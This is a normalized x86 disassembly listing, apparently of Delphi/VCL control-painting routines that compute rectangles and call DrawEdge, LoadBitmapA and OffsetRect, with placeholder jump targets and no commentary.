call sub_41e4e4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbe4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41dbec
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44edcf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423198
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41d400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b524
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41dbec
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbe4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4241ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbc0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e148
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44ba3c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e738
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d6cc
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e4e4
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41dee4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41d400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032a0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e4e4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e738
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f277
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44d7fc
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_44e738
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_44f290
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_44fb98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41dbec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41d400
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404480
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41dbec
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44b524
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e4e4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbe4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41dbec
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41dbec
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbe4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4241ec
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41dbc0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dfc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_44f6db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423198
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
